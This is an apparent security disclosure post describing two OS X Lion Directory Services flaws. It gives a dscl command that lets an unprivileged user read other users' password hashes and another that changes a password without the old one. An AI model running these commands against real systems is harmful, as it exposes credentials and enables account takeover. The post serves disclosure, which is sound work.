Subject: Multiple OS X Lion Vulnerabilities

It appears OS X Lion has multiple issues with Directory Services.

ISSUE #1. Information Disclosure

A non-privileged user has the ability to view password hashes from any other
users on the system:

$ dscl localhost -read /Search/Users/bob


ISSUE #2. Absent authentication

A user can change their password without the need to enter their existing
password:

$ dscl localhost -passwd /Search/Users/<username>
